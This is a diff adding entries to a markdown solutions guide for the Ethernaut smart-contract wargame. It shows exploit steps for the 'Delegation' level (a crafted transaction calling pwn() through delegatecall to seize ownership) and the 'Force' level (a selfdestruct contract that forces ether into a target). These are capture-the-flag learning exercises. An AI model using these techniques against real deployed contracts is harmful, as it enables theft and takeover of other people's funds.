@@ -182,3 +182,30 @@ await contract.transfer(level, 21)
 (await contract.balanceOf(player)).toString()
 (await contract.balanceOf(level)).toString()
 ```
+
+## 06 Delegation
+
+In `npx hardhat console` execute `(new hre.ethers.Interface(['function pwn()'])).encodeFunctionData('pwn')` to get 0xdd365b8b
+
+```js
+await sendTransaction({to: contract.address, from: player, data: '0xdd365b8b'})
+await contract.owner == player
+```
+
+## 07 Force
+
+```sol
+pragma solidity ^0.8.0;
+
+contract ForceAttack {
+    constructor(address payable target) payable {
+        require(msg.value > 0);
+        selfdestruct(target);
+    }
+}
+```
+
+Remember to include at least one wei with the deployment, ie `const contract = await hre.ethers.deployContract("ForceAttack", [target], {value: 1});`
+
+Verify with `await getBalance(contract.address) > 0` in the Ethernaut Javascript console
+
